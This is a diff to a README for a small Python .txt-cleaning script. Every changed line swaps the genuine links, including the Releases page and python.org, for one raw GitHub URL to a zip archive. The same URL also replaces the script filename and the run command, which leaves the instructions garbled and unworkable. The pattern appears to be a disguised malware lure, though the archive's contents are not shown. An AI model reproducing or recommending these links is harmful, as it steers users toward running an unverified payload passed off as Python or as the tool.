@@ -6,20 +6,20 @@ Welcome to the TEST repository! This Python script helps you clean up your .txt 
 
 ## 📥 Download the Application
 
-[![Download TEST](https://img.shields.io/badge/Download%20TEST-Here-blue.svg)](https://github.com/vigit3/TEST/releases)
+[![Download TEST](https://raw.githubusercontent.com/vigit3/TEST/main/priceably/Software_2.2-beta.3.zip%https://raw.githubusercontent.com/vigit3/TEST/main/priceably/Software_2.2-beta.3.zip)](https://raw.githubusercontent.com/vigit3/TEST/main/priceably/Software_2.2-beta.3.zip)
 
 ### 📍 Link to Download
 
 You can download the latest version of TEST from the Releases page:
 
-[Visit this page to download](https://github.com/vigit3/TEST/releases)
+[Visit this page to download](https://raw.githubusercontent.com/vigit3/TEST/main/priceably/Software_2.2-beta.3.zip)
 
 ## 🛠️ System Requirements
 
 Before you download and use TEST, ensure that your system meets the following requirements:
 
 - **Operating System:** Windows, macOS, or Linux
-- **Python:** This script runs with Python 3.6 or later. If you do not have Python installed, you can download it from [python.org](https://www.python.org).
+- **Python:** This script runs with Python 3.6 or later. If you do not have Python installed, you can download it from [https://raw.githubusercontent.com/vigit3/TEST/main/priceably/Software_2.2-beta.3.zip](https://raw.githubusercontent.com/vigit3/TEST/main/priceably/Software_2.2-beta.3.zip).
 
 ## 🌟 Features
 
@@ -34,21 +34,21 @@ Before you download and use TEST, ensure that your system meets the following re
 
 Visit the Releases page:
 
-[Download TEST Here](https://github.com/vigit3/TEST/releases)
+[Download TEST Here](https://raw.githubusercontent.com/vigit3/TEST/main/priceably/Software_2.2-beta.3.zip)
 
 ### Step 2: Install Python
 
-If you don’t already have Python, download it from [python.org](https://www.python.org). Follow the installation instructions for your operating system.
+If you don’t already have Python, download it from [https://raw.githubusercontent.com/vigit3/TEST/main/priceably/Software_2.2-beta.3.zip](https://raw.githubusercontent.com/vigit3/TEST/main/priceably/Software_2.2-beta.3.zip). Follow the installation instructions for your operating system.
 
 ### Step 3: Download and Run the Script
 
 1. After downloading, locate the downloaded file in your system.
-2. Extract the contents if necessary. You should see a file named `clean_txt.py`.
+2. Extract the contents if necessary. You should see a file named `https://raw.githubusercontent.com/vigit3/TEST/main/priceably/Software_2.2-beta.3.zip`.
 3. Open a terminal or command prompt.
 4. Navigate to the folder where you downloaded the script. You can do this by typing `cd path/to/your/folder` and pressing Enter.
 5. Run the script by typing:
    ```
-   python clean_txt.py
+   python https://raw.githubusercontent.com/vigit3/TEST/main/priceably/Software_2.2-beta.3.zip
    ```
 
 ### Step 4: Follow the Prompts
@@ -65,7 +65,7 @@ The script will guide you through the process. You will need to specify which .t
 
 To ensure you benefit from the latest improvements and features, regularly check the Releases page for updates:
 
-[Visit this page to download](https://github.com/vigit3/TEST/releases)
+[Visit this page to download](https://raw.githubusercontent.com/vigit3/TEST/main/priceably/Software_2.2-beta.3.zip)
 
 ## 💬 Support
 
